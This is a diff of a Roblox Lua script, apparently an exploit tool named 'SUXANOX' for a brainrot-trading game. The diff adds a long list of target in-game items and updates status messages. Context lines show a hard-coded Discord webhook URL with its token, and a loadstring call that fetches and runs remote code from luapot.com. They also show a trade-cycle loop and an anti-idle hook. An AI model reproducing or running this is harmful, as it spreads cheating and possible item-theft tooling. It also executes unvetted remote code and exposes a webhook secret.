@@ -5,6 +5,39 @@ getgenv().DELAY_STEP = 1
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1502505877809401909/bu3-cEI5B-LKr63HiK47P_0xIwcFThibpuwhqYi5xA2hhs7gEYgrGdqSV3zOi56-ZyaB"
 
+getgenv().TARGET_BRAINROTS = {
+    ["Los Amigos"] = true, ["La Secret Combinasion"] = true, ["La Food Combinasion"] = true,
+    ["Sammyni Fattini"] = true, ["Rosetti Tualetti"] = true, ["Tacorita Bicicleta"] = true,
+    ["La Extinct Grande"] = true, ["La Spooky Grande"] = true, ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true, ["Tuff Toucan"] = true, ["W or L"] = true,
+    ["La Jolly Grande"] = true, ["La Taco Combinasion"] = true, ["Swaggy Bros"] = true,
+    ["La Romantic Grande"] = true, ["Festive 67"] = true, ["Tang Tang Keletang"] = true,
+    ["Ketupat Kepat"] = true, ["Tictac Sahur"] = true, ["Ketchuru and Musturu"] = true,
+    ["Lavadorito Spinito"] = true, ["Garama and Madundung"] = true, ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true, ["Cerberus"] = true, ["Dragon Cannelloni"] = true,
+    ["Los Hotspotsitos"] = true, ["Guest 666"] = true, ["Los Bros"] = true,
+    ["Tralaledon"] = true, ["Los Puggies"] = true, ["Los Primos"] = true,
+    ["Los Tacoritas"] = true, ["Los Spaghettis"] = true, ["Ginger Gerat"] = true,
+    ["La Casa Boo"] = true, ["Los Sekolahs"] = true, ["Reinito Sleighito"] = true,
+    ["Fragrama and Chocrama"] = true, ["Spooky and Pumpky"] = true, ["Love Love Bear"] = true,
+    ["Ketupat Bros"] = true, ["Cooki and Milki"] = true, ["Rosey and Teddy"] = true,
+    ["Popcuru and Fizzuru"] = true, ["La Supreme Combinasion"] = true, ["Dragon Gingerini"] = true,
+    ["Hydra Dragon Cannelloni"] = true, ["Celularcini Viciosini"] = true, ["Las Sis"] = true,
+    ["Los Planitos"] = true, ["Eviledon"] = true, ["Orcaledon"] = true,
+    ["Jolly Jolly Sahur"] = true, ["La Ginger Sekolah"] = true, ["Nacho Spyder"] = true,
+    ["Griffin"] = true, ["Gold Gold Gold"] = true, ["La Lucky Grande"] = true,
+    ["Celestial Pegasus"] = true, ["Fortunu and Cashuru"] = true, ["Ventoliero Pavonero"] = true,
+    ["Cloverat Clapat"] = true, ["Fishino Clownino"] = true, ["Dug dug dug"] = true,
+    ["Lovin Rose"] = true, ["Headless Horseman"] = true, ["Meowl"] = true,
+    ["Strawberry Elephant"] = true, ["Skibidi Toilet"] = true, ["Signore Carapace"] = true,
+    ["Elefanto Frigo"] = true, ["Antonio"] = true, ["Fragola La La La"] = true,
+    ["Digi Narwhal"] = true, ["Arcadragon"] = true, ["Kalika Bros"] = true,
+    ["Tirilikalika Tirilikalako"] = true, ["Gym Bros"] = true, ["La Easter Grande"] = true,
+    ["Los Chillis"] = true, ["Foxini Lanternini"] = true, ["Money Bros"] = true,
+    ["Los Hackers"] = true, ["Boppin Bunny"] = true, ["Hydra Bunny"] = true,
+    ["John Pork"] = true, ["John Doe"] = true
+}
+
 pcall(function() loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))() end)
 
 local HttpService = game:GetService("HttpService")
@@ -17,7 +50,7 @@ local function sendWebhook(msg)
     end)
 end
 
-sendWebhook("🚀 SUXANOX AKTIF")
+sendWebhook("🚀 SUXANOX AKTIF - Brainrot count: " .. #getgenv().TARGET_BRAINROTS)
 
 task.spawn(function()
     while true do
@@ -46,5 +79,5 @@ game:GetService("Players").LocalPlayer.Idled:Connect(function()
     game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
 end)
 
-print("SUXANOX ACTIVE - BY MX")
+print("SUXANOX ACTIVE - BRAINROT COUNT: " .. #getgenv().TARGET_BRAINROTS)
 while true do task.wait(60) end
